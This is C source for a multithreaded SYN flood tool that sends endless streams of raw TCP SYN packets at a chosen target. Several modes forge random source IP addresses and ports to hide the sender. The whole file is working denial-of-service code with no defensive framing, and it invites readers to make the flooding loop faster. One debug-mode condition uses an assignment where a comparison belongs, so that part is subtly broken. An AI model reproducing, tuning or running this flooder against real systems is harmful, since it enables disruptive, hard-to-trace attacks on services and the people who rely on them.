#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>

#include"syn.h"


//Make the first and second byte exchange
unsigned short reverse_short(unsigned short str)
{
	unsigned char temp = (unsigned char)(str>>8);
	str <<= 8;
	str += temp;
	return str;
}


unsigned short ip_checksum(unsigned short *buffer)
{
	int sum = 0;

	for (int i = 0; i < 10; i++)
	{
		sum += reverse_short(buffer[i]);
	}

	unsigned short *temp = (unsigned short *)&sum + 1;
	sum += *temp;
	return (unsigned short)~sum;
}



unsigned short tcp_checksum(unsigned short *buffer)
{
	int_short run;
	run.sum = 0;

	//buffer += (20 - 8) / 2;
	buffer += 6;

	//For faster Assembly line speed, do not use branch structures.
	// for (int i = 0; i < 14; i++)
	// {
	// 	run.sum += reverse_short(buffer[i]);
	// }
	run.sum += reverse_short(buffer[0]);
	run.sum += reverse_short(buffer[1]);
	run.sum += reverse_short(buffer[2]);
	run.sum += reverse_short(buffer[3]);
	run.sum += reverse_short(buffer[4]);
	run.sum += reverse_short(buffer[5]);
	run.sum += reverse_short(buffer[6]);
	run.sum += reverse_short(buffer[7]);
	run.sum += reverse_short(buffer[8]);
	run.sum += reverse_short(buffer[9]);
	run.sum += reverse_short(buffer[10]);
	run.sum += reverse_short(buffer[11]);
	run.sum += reverse_short(buffer[12]);
	run.sum += reverse_short(buffer[13]);

	//sum += (6 + 20);
	run.sum += 26;

	run.low_and_high[0] += run.low_and_high[1];

	return (unsigned short)~run.low_and_high[0];
}


void init_header(ip_struct *ip, tcphdr_struct *tcp,char *dst_ip,int dst_port)
{
	int len = sizeof(ip_struct) + sizeof(tcphdr_struct);
	// IP header data initialization
	ip->hl = (4 << 4 | sizeof(ip_struct) / sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	//ip->checksum = 0;
	ip->sourceIP = 0;
	ip->destIP = inet_addr(dst_ip);


	tcp->dport = htons(dst_port);
	tcp->seq = htonl(rand() % 90000000 + 2345);
	tcp->ack = 0;
	tcp->lenres = (sizeof(tcphdr_struct) / 4 << 4 | 0);
	tcp->flag = 0x02;
	tcp->win = htons(2048);
	tcp->urp = 0;

	srand((unsigned)time(NULL));

}


/* Send the SYN package function
* Fill in IP header, TCP header
* TCP pseudo-headers are used only for the calculation of checksums

*/
void *send_synflood(void *arg)
{
	printf("Thread pid: %d is start!\n",getpid());
	thread_arg *_arg=arg;
	//char buf[100], sendbuf[100];
	int len;
	ip_tcp buf;


	len = sizeof(ip_struct) + sizeof(tcphdr_struct);

	/* Initialize header information */
	init_header(&buf._ip, &buf.tcp,_arg->dst_ip,_arg->dst_port);

	//Note: this is the kernel part of the program.
	//Welcome to optimize the efficiency of the kernel.
	
	int _sockfd=_arg->sockfd;
	struct sockaddr_in *_addr=_arg->addr;

	switch (_arg->model)
	{
	case MODEL_FAST:
		buf._ip.sourceIP = inet_addr(_arg->source_ip);
		buf.tcp.sport=_arg->source_port;

		while (1)
		{
			buf.tcp.sum = 0;
			//buf._ip.checksum = 0;


			//The IP checksum system computes, so you don't waste the CPU here
			//buf._ip.checksum = reverse_short(ip_checksum((unsigned short *)&buf));

			//Calaulate TCP checksum
			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr));
		}
		
		break;
	case MODEL_NORMAL:
		while (1)
		{
			buf.tcp.sum = 0;

			buf._ip.sourceIP = rand();


			buf.tcp.sport = (u_int16_t)(rand() % 59152 + 6383);

			
			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}
		
		break;
	case MODEL_SET_IP:
		buf._ip.sourceIP = inet_addr(_arg->source_ip);
		while (1)
		{
			buf.tcp.sum = 0;

			buf.tcp.sport = (u_int16_t)(rand() % 59152 + 6383);

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}

		break;
	case MODEL_SET_PORT:

		buf.tcp.sport=_arg->source_port;
		while (1)
		{
			buf.tcp.sum = 0;

			buf._ip.sourceIP = rand();

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}

		break;
	case MODEL_SET_IP_AND_PORT:
		buf._ip.sourceIP = inet_addr(_arg->source_ip);
		buf.tcp.sport=_arg->source_port;

		while (1)
		{
			buf.tcp.sum = 0;

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}

		break;
	
	case MODEL_DEBUG:
		while (1)
		{
			pthread_mutex_lock(_arg->mutex);
			pthread_mutex_unlock(_arg->mutex);
			buf.tcp.sum = 0;

			if(_arg->source_ip[0]=0)
			{
				buf._ip.sourceIP = rand();
			}
			else
			{
				buf._ip.sourceIP = inet_addr(_arg->source_ip);
			}
			
			

			if(_arg->source_port==0)
			{
				buf.tcp.sport = (u_int16_t)(rand() % 59152 + 6383);
			}
			else
			{
				buf.tcp.sport=_arg->source_port;
			}

			buf._ip.destIP=inet_addr(_arg->dst_ip);
			buf.tcp.dport=reverse_short(_arg->dst_port);

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}

			if(_arg->time>0)
			{
				usleep(_arg->time);
			}
		}
		
		break;
	
	default:
			break;
	}

	printf("Thread pid: %d is end!\n",getpid());
	
}


void sig_int(int signo)
{
	puts("\nGoodbye!");
	exit(0);
}
